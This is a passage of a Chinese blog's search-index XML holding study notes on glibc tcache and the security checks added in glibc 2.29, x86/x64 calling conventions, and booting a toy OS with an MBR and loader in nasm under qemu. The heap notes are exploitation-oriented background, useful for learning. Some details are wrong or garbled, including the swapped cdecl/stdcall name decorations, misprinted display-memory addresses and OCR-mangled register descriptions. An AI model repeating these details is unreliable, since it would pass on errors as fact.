class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">	  &#123;</span><br><span class="line">	    tcache_put (p, tc_idx);</span><br><span class="line">	    <span class="keyword">return</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>也是处于_int_free代码的顶部，先于其他bin收集chunk。</p>
<p>然后检查了bin中的chunk的数目不能大于总chunk数目。</p>
<p>然后使用tcache_put取出chunk。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同样也是十分简陋，直接将tcache_entry(chunk2mem代码重用)链入对应bin中。</p>
<h2 id="glibc-2-29"><a href="#glibc-2-29" class="headerlink" title="glibc_2.29"></a>glibc_2.29</h2><h3 id="tcache-1"><a href="#tcache-1" class="headerlink" title="tcache"></a>tcache</h3><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">typedef struct tcache_entry</span><br><span class="line">&#123;</span><br><span class="line">  struct tcache_entry *next;</span><br><span class="line"><span class="addition">+ /* This field exists to detect double frees.  */</span></span><br><span class="line"><span class="addition">+ struct tcache_perthread_struct *key;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<p>增加了一个key指针，指向当前线程的tcache_perthread_struct管理结构体，检查double free起作用。</p>
<h4 id="tcache-put-1"><a href="#tcache-put-1" class="headerlink" title="tcache_put"></a>tcache_put</h4><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">static __always_inline void</span><br><span class="line">tcache_put (mchunkptr chunk, size_t tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line"><span class="addition">+ /* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="addition">+    detect a double free.  */</span></span><br><span class="line"><span class="addition">+ e-&gt;key = tcache;</span></span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>tcache_put中进行了double free检查，遍历tcache_bin中检查是否有待释放chunk。</p>
<h3 id="malloc-1"><a href="#malloc-1" class="headerlink" title="malloc"></a>malloc</h3><p>在bins的循环中加了一大批检查</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">  for (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      int iters = 0;</span><br><span class="line">      while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line">          mchunkptr next = chunk_at_offset (victim, size);</span><br><span class="line"></span><br><span class="line">          if (__glibc_unlikely (size &lt;= 2 * SIZE_SZ)</span><br><span class="line">              || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (&quot;malloc(): invalid size (unsorted)&quot;);</span><br><span class="line"><span class="addition">+         if (__glibc_unlikely (chunksize_nomask (next) &lt; 2 * SIZE_SZ)</span></span><br><span class="line"><span class="addition">+             || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span></span><br><span class="line"><span class="addition">+           malloc_printerr (&quot;malloc(): invalid next size (unsorted)&quot;);</span></span><br><span class="line"><span class="addition">+         if (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span></span><br><span class="line"><span class="addition">+           malloc_printerr (&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;);</span></span><br><span class="line"><span class="addition">+         if (__glibc_unlikely (bck-&gt;fd != victim)</span></span><br><span class="line"><span class="addition">+             || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span></span><br><span class="line"><span class="addition">+           malloc_printerr (&quot;malloc(): unsorted double linked list corrupted&quot;);</span></span><br><span class="line"><span class="addition">+         if (__glibc_unlikely (prev_inuse (next)))</span></span><br><span class="line"><span class="addition">+           malloc_printerr (&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;);</span></span><br><span class="line">……</span><br><span class="line">          /* remove from unsorted list */</span><br><span class="line"><span class="addition">+         if (__glibc_unlikely (bck-&gt;fd != victim))</span></span><br><span class="line"><span class="addition">+           malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<h3 id="free-1"><a href="#free-1" class="headerlink" title="free"></a>free</h3><p>unlink前新加了检查prev_size。</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"> /* consolidate backward */</span><br><span class="line">     if (!prev_inuse(p)) &#123;</span><br><span class="line">       prevsize = prev_size (p);</span><br><span class="line">       size += prevsize;</span><br><span class="line">       p = chunk_at_offset(p, -((long) prevsize));</span><br><span class="line"><span class="addition">+      if (__glibc_unlikely (chunksize(p) != prevsize))</span></span><br><span class="line"><span class="addition">+        malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);</span></span><br><span class="line">       unlink_chunk (av, p);</span><br><span class="line">     &#125;</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p><strong>参考</strong></p>
<p><a href="https://ctf-wiki.org/">ctf-wiki</a><br><a href="https://www.freebuf.com/articles/system/234219.html">技术讨论 | Glibc中堆管理的变化</a><br><a href="https://paper.seebug.org/papers/Archive/refs/heap/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf">Ptmalloc2 源代码分析</a></p>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>函数调用约定</title>
    <url>/2022/03/04/%E5%85%A5%E6%A0%88%E9%A1%BA%E5%BA%8F/</url>
    <content><![CDATA[<p>调用函数时，所有函数(包括库函数)调用都必须遵守一套调用约定。主要规定调用函数时如何使用通用寄存器，包括函数参数的传递顺序和方式、栈的维护方式，名字修饰(Name-mangling)策略。</p>
<span id="more"></span>

<h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><h2 id="x86-x64"><a href="#x86-x64" class="headerlink" title="x86/x64"></a>x86/x64</h2><h3 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h3><table>
<thead>
<tr>
<th>64bit</th>
<th>32bit</th>
<th>16bit</th>
<th>8bit</th>
</tr>
</thead>
<tbody><tr>
<td>RAX</td>
<td>EAX</td>
<td>AX</td>
<td>AL</td>
</tr>
<tr>
<td>RBX</td>
<td>EBX</td>
<td>BX</td>
<td>BL</td>
</tr>
<tr>
<td>RCX</td>
<td>ECX</td>
<td>CX</td>
<td>CL</td>
</tr>
<tr>
<td>RDX</td>
<td>EDX</td>
<td>DX</td>
<td>DL</td>
</tr>
<tr>
<td>RSI</td>
<td>ESI</td>
<td>SI</td>
<td>SIL</td>
</tr>
<tr>
<td>RDI</td>
<td>EDI</td>
<td>DI</td>
<td>DIL</td>
</tr>
<tr>
<td>RBP</td>
<td>EBP</td>
<td>BP</td>
<td>BPL</td>
</tr>
<tr>
<td>RSP</td>
<td>ESP</td>
<td>SP</td>
<td>SPL</td>
</tr>
<tr>
<td>R8</td>
<td>R8D</td>
<td>R8W</td>
<td>R8B</td>
</tr>
<tr>
<td>R9</td>
<td>R9D</td>
<td>R9W</td>
<td>R9B</td>
</tr>
<tr>
<td>R10</td>
<td>R10D</td>
<td>R10W</td>
<td>R10B</td>
</tr>
<tr>
<td>R11</td>
<td>R11D</td>
<td>R11W</td>
<td>R11B</td>
</tr>
<tr>
<td>R12</td>
<td>R12D</td>
<td>R12W</td>
<td>R12B</td>
</tr>
<tr>
<td>R13</td>
<td>R13D</td>
<td>R13W</td>
<td>R13B</td>
</tr>
<tr>
<td>R14</td>
<td>R14D</td>
<td>R14W</td>
<td>R14B</td>
</tr>
<tr>
<td>R15</td>
<td>R15D</td>
<td>R15W</td>
<td>R15B</td>
</tr>
<tr>
<td><em>加上<code>L</code>即说明是该寄存器的低8位，若加上<code>h</code>则说明是该寄存器的高8位，因此8bit寄存器不止表中列出的，如<code>AX</code>寄存器(长度为2字节)的低八位为<code>AL</code>、高八位为<code>AH</code>(长度为1字节)</em></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>而这些寄存器在一次函数调用中充当的角色:</p>
<ul>
<li>x64<ul>
<li>RBP: 基址针寄存器(Base Pointer Register)，该指针保存当前被调用函数(callee)栈帧的底部指针。而函数的栈帧将会保存调用函数(caller)栈帧的指针。</li>
<li>RSP: 堆栈指针寄存器(Stack Pointer Register)，该指针保存当前被调用函数栈帧的顶部指针。</li>
<li>RDI: 作为被调用函数的参数1</li>
<li>RSI: 作为被调用函数的参数2</li>
<li>RDX: 作为被调用函数的参数3</li>
<li>RCX: 作为被调用函数的参数4</li>
<li>R8: 作为被调用函数的参数5</li>
<li>R9: 作为被调用函数的参数6</li>
<li>RAX: 累加器(Accumulator)，用来执行算术操作，存放函数的返回值。</li>
<li>RBX: 基地址寄存器(Base Register)，主要用于在内存寻址时存放基地址。</li>
</ul>
</li>
<li>x86: 和x64的区别为，传参时使用栈，其他几乎一致。<ul>
<li>ECX: 计数寄存器(Count Register)，用来标记循环次数(REP和LOOP指令)。</li>
<li>EDX: 数据寄存器(Data Register)，进行计算时用来保存操作数，且总是被用来放整数除法产生的余数。</li>
</ul>
</li>
</ul>
<p>另外还需要知道的寄存器为IP寄存器(EIP, RIP)，或者也叫PC寄存器，用来存放当前代码段即将被执行的下一条指令的偏移。然后取出指令并执行时，会获取该指令的长度得到下一条指令的地址，并保存。</p>
<p>其他寄存器如段寄存器和状态寄存器可以看这篇<a href="https://zhuanlan.zhihu.com/p/502718676">总结</a></p>
<h1 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h1><p>首先是<a href="https://messap.github.io/2022/03/04/%E6%A0%88%E4%BB%8B%E7%BB%8D/">栈介绍</a>，可以看到函数调用的过程其实是十分有规律的，是因为编译器在编译代码时，遵循了函数调用约定(不唯一)，这个约定在不同平台都是一致的，差异仅在寄存器不同，但并没有讲到参数的传递过程。</p>
<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>x86平台下常用的有三种调用约定，__cdecl、__stdcall、__fastcall。</p>
<p>若想使用不同约定去编译，则需要将约定作为修饰符写在函数名前，如<code>windows: int __cdecl TestFunc(int); Linux: int __attribute__((__cdecl__)) TestFunc(int);</code>。</p>
<h3 id="cdecl调用约定"><a href="#cdecl调用约定" class="headerlink" title="__cdecl调用约定"></a>__cdecl调用约定</h3><p>又称C调用约定，是C/C++编译器默认的函数调用约定。</p>
<p><strong>参数传递顺序</strong></p>
<p>参数按照从右到左的顺序入栈，且支持可变参数，即直接通过相对于<code>offset(%bp)</code>来获取参数，返回值保存在EAX中。</p>
<p><strong>栈的维护方式</strong></p>
<p>由被调函数抬栈(执行<code>sub xxx, sp</code>指令)，调用函数清理被调函数的参数(执行<code>add xxx, sp</code>指令)。</p>
<p><strong>函数名修饰</strong></p>
<p><code>_name@number</code></p>
<h3 id="stdcall调用约定"><a href="#stdcall调用约定" class="headerlink" title="__stdcall调用约定"></a>__stdcall调用约定</h3><p>Pascal程序缺省调用方式，WinAPI也多采用该调用约定。</p>
<p><strong>参数传递顺序</strong></p>
<p>参数从右向左顺序入栈，除指针或引用类型参数外所有参数采用传值方式传递，不支持可变参数，返回值在EAX中。</p>
<p><strong>栈的维护方式</strong></p>
<p>由被调函数抬栈(执行<code>sub xxx, sp</code>指令)，被调函数清理参数(执行<code>ret xxx</code>指令)。</p>
<p><strong>函数名修饰</strong></p>
<p><code>_name</code></p>
<h3 id="fastcall调用约定"><a href="#fastcall调用约定" class="headerlink" title="__fastcall调用约定"></a>__fastcall调用约定</h3><p><strong>参数传递顺序</strong></p>
<p>参数从右向左顺序入栈，但前两个参数保存在ECX和EDX中，不支持可变参数，返回值在EAX中。</p>
<p><strong>栈的维护方式</strong></p>
<p>由被调函数抬栈(执行<code>sub xxx, sp</code>指令)，被调函数清理参数(执行<code>ret xxx</code>指令)。</p>
<p><strong>函数名修饰</strong></p>
<p><code>@name@number</code></p>
<h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>而x64平台下更加规范，只能使用默认的调用约定，因此使用修饰符指定调用约定时会被忽略。</p>
<p>参数按照从右到左的顺序保存进寄存器同时也会入栈(多余了?)，保存进寄存器中的参数只有前6个，返回值保存在RAX中，由被调函数退栈。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnblogs.com/FrankChen831X/p/10482718.html">x86寄存器总结</a><br><a href="https://www.cnblogs.com/clover-toeic/p/3755401.html">C语言函数调用栈(一)</a><br><a href="https://www.cnblogs.com/clover-toeic/p/3756668.html">C语言函数调用栈(二)</a></p>
]]></content>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实现</title>
    <url>/2023/02/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>qemu, nasm, dd</p>
<h3 id="qemu-gdb-debug"><a href="#qemu-gdb-debug" class="headerlink" title="qemu+gdb debug"></a>qemu+gdb debug</h3><ul>
<li>在qemu-system加上参数<code>-s -S</code>，默认端口是1234</li>
<li>使用gdb连接该端口(<code>target remote :1234</code>)后即可调试，需要注意的是，在实模式下调试，使用的地址都是物理地址，因此下断点使用<code>hbreak</code></li>
</ul>
<h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><table>
<thead>
<tr>
<th align="left">寄存器</th>
<th align="left">助记名称</th>
<th align="left">功能描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">ax</td>
<td align="left">累加器(accumulator)</td>
<td align="left">使用频度最高，常用于算术运算、逻辑运算、保存与外设输入输出的数据</td>
</tr>
<tr>
<td align="left">bx</td>
<td align="left">基址寄存器(base)</td>
<td align="left">常用来存储内存地址，用此地址作为基址，用来遍历一 片内存区域</td>
</tr>
<tr>
<td align="left">cx</td>
<td align="left">计数器(counter)</td>
<td align="left">顾名思义 ， 计数器的作用就是计数，所以常用于循环指令中的循环次数</td>
</tr>
<tr>
<td align="left">dx</td>
<td align="left">数据寄存器(data)</td>
<td align="left">可用于存放数据 ， 通常情况下只用于保存外设控制器的端口号地址</td>
</tr>
<tr>
<td align="left">si</td>
<td align="left">源变址寄存器(source index)</td>
<td align="left">常用于字符串操作中的数据源地址，即被传送的数据在哪里 ． 通常 言需要与其他指令配合使用，如批量数据传送指令族 movs[bwd]</td>
</tr>
<tr>
<td align="left">di</td>
<td align="left">目的变址寄存器(destination index)</td>
<td align="left">和si一样，常用于字符串操作。但di是用于数据的目的地址，即数据被传送到哪里</td>
</tr>
<tr>
<td align="left">sp</td>
<td align="left">栈指针寄存器(stack pointer)</td>
<td align="left">其段基址是SS，用来指向钱顶 ． 随着钱中数据的迸出， push 和 pop 这两个对战操作的指令会修改sp的值</td>
</tr>
<tr>
<td align="left">bp</td>
<td align="left">基址指针(base pointer)</td>
<td align="left">访问校有两种方式， 一种是用 push 和 pop 指令操作钱， sp 指针的值会自动更新，但我们只能获取钱顶 sp 指针指向的数据。 很多时候，我们需要读写在校底和技顶之间的数掘，处理器为了让开发人员方便控制战中数据，还提供了把钱当成数据段来访问的为式，即提供了寄存器 hp ，所以 bp 默认的段寄存器就是 SS ，可通过 SS: bp 的方式把钱当成普通的数据段采访问，只不过 hp 不像 sp 那样随 push 、 pop 自动改变</td>
</tr>
</tbody></table>
<h2 id="实模式与保护模式"><a href="#实模式与保护模式" class="headerlink" title="实模式与保护模式"></a>实模式与保护模式</h2><p>CPU的16位运行模式，被称为实模式。实模式下，操作系统和用户程序属于同一特权级;程序中涉及到的地址都是物理地址;用户程序能够随意访问所有内存。因为以上三点，所以实模式是非常不安全的。</p>
<p>有了32位CPU后，就有了保护模式的概念。保护模式相比于实模式则安全许多，有了分页、分段机制(主要是分段模式)，使得操作系统在保护模式中寻址将通过查表的方式来访问每个段，并通过段内偏移来访问指定内容(段地址:段内偏移)。如此这般，从直接映射的物理地址，变成了表到物理地址的间接映射。</p>
<h2 id="计算机启动需要什么"><a href="#计算机启动需要什么" class="headerlink" title="计算机启动需要什么"></a>计算机启动需要什么</h2><ul>
<li>BIOS: Base Input &amp; Output System, 主要提供了访问硬件的方式。计算机通电后将执行ROM中的BIOS程序，BIOS程序位于虚拟内存地址的末尾，大小为1MB。接着BIOS会从启动盘的第一扇区读取内容，而该扇区为MBR。</li>
<li>MBR: Main Boot Sector, 主引导扇区，该扇区位于启动盘的0面0道1扇区，有512字节的数据。BIOS将它加载到物理地址0x7c00处(因为BIOS是在实模式下执行)，然后判断是否有效。BIOS会首先检查这个MBR的最后两个字节，一个有效的主引导扇区，其最后两字节是0x55 和0xAA，若该MBR有效则跳转到0x7c00执行。</li>
</ul>
<h2 id="x86实模式内存分配"><a href="#x86实模式内存分配" class="headerlink" title="x86实模式内存分配"></a>x86实模式内存分配</h2><h3 id="显存"><a href="#显存" class="headerlink" title="显存"></a>显存</h3><table>
<thead>
<tr>
<th align="left">起始</th>
<th align="left">结束</th>
<th align="left">大小</th>
<th align="left">用途</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0xC0000</td>
<td align="left">0xC7FFF</td>
<td align="left">32KB</td>
<td align="left">显示适配器BIOS</td>
</tr>
<tr>
<td align="left">0x88000</td>
<td align="left">0xBFFFF</td>
<td align="left">32KB</td>
<td align="left">用于文本模式显示适配器</td>
</tr>
<tr>
<td align="left">0x80000</td>
<td align="left">0xB7FFF</td>
<td align="left">32KB</td>
<td align="left">用于黑白显示适配器</td>
</tr>
<tr>
<td align="left">0xAOOOO</td>
<td align="left">0xAFFFF</td>
<td align="left">64KB</td>
<td align="left">用于彩色显示适配器</td>
</tr>
</tbody></table>
<h3 id="硬盘控制器端口寄存器"><a href="#硬盘控制器端口寄存器" class="headerlink" title="硬盘控制器端口寄存器"></a>硬盘控制器端口寄存器</h3><table>
    <tr>
        <td colspan='2'>IO端口</td>
        <td colspan='2'>端口用途</td>
    </tr>
    <tr>
        <td>Primary通道</td>
        <td>Secondary通道</td>
        <td>读操作时</td>
        <td>写操作时</td>
    </tr>
    <tr>
        <td colspan='4'>Command Block registers</td>
    </tr>
        <td>0x1F0</td>
        <td>0x170</td>
        <td>Data</td>
        <td>Data</td>
    <tr>
        <td>0x1F1</td>
        <td>0x171</td>
        <td>Error</td>
        <td>Features</td>
    </tr>
    <tr>
        <td>0x1F2</td>
        <td>0x172</td>
        <td>Sector count</td>
        <td>Sector count</td>
    </tr>
    <tr>
        <td>0x1F3</td>
        <td>0x173</td>
        <td>LBA low</td>
        <td>LBA low</td>
    </tr>
    <tr>
        <td>0x1F4</td>
        <td>0x174</td>
        <td>LBA mid</td>
        <td>LBA mid</td>
    </tr>
    <tr>
        <td>0x1F5</td>
        <td>0x175</td>
        <td>LBA high</td>
        <td>LBA high</td>
    </tr>
    <tr>
        <td>0x1F6</td>
        <td>0x176</td>
        <td>Device</td>
        <td>Device</td>
    </tr>
    <tr>
        <td>0x1F7</td>
        <td>0x177</td>
        <td>Status</td>
        <td>Command</td>
    </tr>
    <tr>
        <td colspan='4'>Control Block registers</td>
    </tr>
    <tr>
        <td>0x3F6</td>
        <td>0x376</td>
        <td>Alternate status</td>
        <td>Device Control</td>
    </tr>
</table>

<h1 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h1><p>书中使用的是bochs,我这里就用qemu来搭建好了</p>
<p>首先是创建一个虚拟硬盘。使用qemu的工具，创建一个60M大小，qcow2文件类型的虚拟硬盘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-img create -f qcow2 disk.img 60M</span><br></pre></td></tr></table></figure>

<p>然后设置参数以此硬盘为启动盘，启动VM</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">qemu-system-i386 -m 32\</span><br><span class="line">	-smp 2\</span><br><span class="line">	-enable-kvm\</span><br><span class="line">	-hda disk.img</span><br></pre></td></tr></table></figure>

<p>接着会打印出以下信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">VNC server running on ::1:5900</span><br></pre></td></tr></table></figure>

<p>接着使用gvncviewer去连接这个端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gvncviewer ::1:5900</span><br></pre></td></tr></table></figure>

<p>也可以在使用qemu-system时加入选项<code>-nographic</code>来关闭图形输出，不使用vnc，但是这样就不能打印字符了。或者加上选项<code>-display curses</code>，这样能完美打印出想要的结果，并使用<code>alt-1/2</code>来切换命令行，想要退出时，可以使用<code>alt-2</code>切换至qemu命令行执行<code>quit</code>。</p>
<p>这个时候是启动失败的，弹出的终端中会显示<code>No bootable device</code>。也就是无法读取启动盘(因为是空的嘛)，但是到此环境已经是搭建好了</p>
<h1 id="编写MBR"><a href="#编写MBR" class="headerlink" title="编写MBR"></a>编写MBR</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;MBR</span><br><span class="line">%include &quot;boot.inc&quot;</span><br><span class="line">section MBR vstart=0x7c00</span><br><span class="line"></span><br><span class="line">;initialize registers</span><br><span class="line">;---------------------------</span><br><span class="line">mov ax,cs</span><br><span class="line">mov ds,ax</span><br><span class="line">mov es,ax</span><br><span class="line">mov ss,ax</span><br><span class="line">mov fs,ax</span><br><span class="line">mov sp,0x7c00</span><br><span class="line">mov ax,0xb800</span><br><span class="line">mov gs,ax</span><br><span class="line"></span><br><span class="line">;clear screen</span><br><span class="line">;---------------------------</span><br><span class="line">;using 0x06 function</span><br><span class="line">;---------------------------</span><br><span class="line">;AH      function code</span><br><span class="line">;AL      scroll line counts</span><br><span class="line">;BH      properties</span><br><span class="line">;(CL,CH) window upper left corner position</span><br><span class="line">;(DL,DH) window lower right corner position</span><br><span class="line">;---------------------------</span><br><span class="line">mov ax, 0x600</span><br><span class="line">mov bx, 0x700</span><br><span class="line">mov cx, 0</span><br><span class="line">mov dx, 0x184f</span><br><span class="line">int 0x10</span><br><span class="line"></span><br><span class="line">;print</span><br><span class="line">;---------------------------</span><br><span class="line">mov byte [gs:0x00],&#x27;1&#x27;</span><br><span class="line">mov byte [gs:0x01],0x04</span><br><span class="line"></span><br><span class="line">mov byte [gs:0x04],&#x27;M&#x27;</span><br><span class="line">mov byte [gs:0x05],0x04</span><br><span class="line"></span><br><span class="line">mov byte [gs:0x06],&#x27;B&#x27;</span><br><span class="line">mov byte [gs:0x07],0x04</span><br><span class="line"></span><br><span class="line">mov byte [gs:0x08],&#x27;R&#x27;</span><br><span class="line">mov byte [gs:0x09],0x04</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mov eax,LOADER_START_SECTOR</span><br><span class="line">mov bx,LOADER_BASE_ADDR</span><br><span class="line">mov cx,1</span><br><span class="line">call rd_disk_m_16           ;AX 0x2</span><br><span class="line">                            ;BX 0x900</span><br><span class="line">                            ;CX 1</span><br><span class="line">jmp LOADER_BASE_ADDR</span><br><span class="line"></span><br><span class="line">;read disk</span><br><span class="line">;---------------------------</span><br><span class="line">;read n sectors from disk</span><br><span class="line">;---------------------------</span><br><span class="line">;AX LBA</span><br><span class="line">;BX loader base address</span><br><span class="line">;CX number of sectors</span><br><span class="line">;---------------------------</span><br><span class="line">rd_disk_m_16:</span><br><span class="line">	mov esi,eax               ;backup eax</span><br><span class="line">	mov di,cx                 ;backup cx</span><br><span class="line">	;1. set sectors count</span><br><span class="line">	;-------------------------</span><br><span class="line">	mov dx,0x1f2</span><br><span class="line">	mov al,cl</span><br><span class="line">	out dx,al                 ;number of sectors</span><br><span class="line">	mov eax,esi               ;recovery eax</span><br><span class="line">	;2. store LBA address in 0x1f3~0x1f6</span><br><span class="line">	;-------------------------</span><br><span class="line">	mov dx,0x1f3</span><br><span class="line">	out dx,al</span><br><span class="line">	</span><br><span class="line">	mov cl,8</span><br><span class="line">	shr eax,cl</span><br><span class="line">	mov dx,0x1f4</span><br><span class="line">	out dx,al</span><br><span class="line">	</span><br><span class="line">	shr eax,cl</span><br><span class="line">	mov dx,0x1f5</span><br><span class="line">	out dx,al</span><br><span class="line">	</span><br><span class="line">	shr eax,cl</span><br><span class="line">	and al,0x0f               ;address remain 3 bit</span><br><span class="line">	or al,0xe0                ;1010+0100(LBA mode)</span><br><span class="line">	mov dx,0x1f6</span><br><span class="line">	out dx,al</span><br><span class="line">	</span><br><span class="line">	;3. write command in 0x1f7</span><br><span class="line">	;-------------------------</span><br><span class="line">	mov dx,0x1f7</span><br><span class="line">	mov al,0x20               ;0x20: read command</span><br><span class="line">	out dx,al</span><br><span class="line"></span><br><span class="line">	;4. check disk status</span><br><span class="line">	;-------------------------</span><br><span class="line">.not_readey:</span><br><span class="line">	nop</span><br><span class="line">	in al,dx</span><br><span class="line">	and al,0x88</span><br><span class="line">	cmp al,0x08</span><br><span class="line">	jnz .not_readey</span><br><span class="line">	;5. read data from 0x1f0</span><br><span class="line">	;-------------------------</span><br><span class="line">	mov ax,di                 ;sector counts</span><br><span class="line">	mov dx,256                ;each sectors need to loop 256 cycles(each time read 1 word but 1 sector has 512 bytes)</span><br><span class="line">	mul dx</span><br><span class="line">	mov cx,ax                 ;CX loop counts</span><br><span class="line">	mov dx,0x1f0</span><br><span class="line">.go_on_read:</span><br><span class="line">	in ax,dx</span><br><span class="line">	mov [bx],ax</span><br><span class="line">	add bx,2</span><br><span class="line">	loop .go_on_read</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">	times 510-($-$$) db 0</span><br><span class="line">	</span><br><span class="line">	db 0x55,0xaa</span><br></pre></td></tr></table></figure>

<p>boot.inc内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;load from START sector &amp; store in BASE address</span><br><span class="line">;---------------------------</span><br><span class="line">LOADER_BASE_ADDR equ 0x900</span><br><span class="line">LOADER_START_SECTOR equ 0x2</span><br></pre></td></tr></table></figure>

<p>MBR中程序的大致内容为，打印字符串’1 MBR’，然后从硬盘中的第3个扇区(idx=2)读取loader程序到内存地址为0x900的位置并执行</p>
<p>在编写一个简易程序作为loader，来验证是否成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%include &quot;boot.inc&quot;</span><br><span class="line">section loader vstart=LOADER_BASE_ADDR</span><br><span class="line"></span><br><span class="line">mov byte [gs:0x00],&#x27;2&#x27;</span><br><span class="line">mov byte [gs:0x01],0x04</span><br><span class="line">mov byte [gs:0x04],&#x27;L&#x27;</span><br><span class="line">mov byte [gs:0x05],0x04</span><br><span class="line">mov byte [gs:0x06],&#x27;o&#x27;</span><br><span class="line">mov byte [gs:0x07],0x04</span><br><span class="line">mov byte [gs:0x08],&#x27;a&#x27;</span><br><span class="line">mov byte [gs:0x09],0x04</span><br><span class="line">mov byte [gs:0x0a],&#x27;d&#x27;</span><br><span class="line">mov byte [gs:0x0b],0x04</span><br><span class="line">mov byte [gs:0x0c],&#x27;e&#x27;</span><br><span class="line">mov byte [gs:0x0d],0x04</span><br><span class="line">mov byte [gs:0x0e],&#x27;r&#x27;</span><br><span class="line">mov byte [gs:0x0f],0x04</span><br><span class="line"></span><br><span class="line">jmp $</span><br></pre></td></tr></table></figure>

<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nasm /path/mbr.bin -o mbr.bin -I /path/include</span><br><span class="line">nasm /path/loader.bin -o loader.bin -I /path/include</span><br></pre></td></tr></table></figure>

<h2 id="写入虚拟磁盘"><a href="#写入虚拟磁盘" class="headerlink" title="写入虚拟磁盘"></a>写入虚拟磁盘</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dd if=/path/mbr.bin of=&lt;virtual disk path&gt; bs=512 count=1 conv=notrunc seek=0</span><br><span class="line">dd if=/path/loader.bin of=&lt;virtual disk path&gt; bs=512 count=1 conv=notrunc seek=2</span><br></pre></td></tr></table></figure>

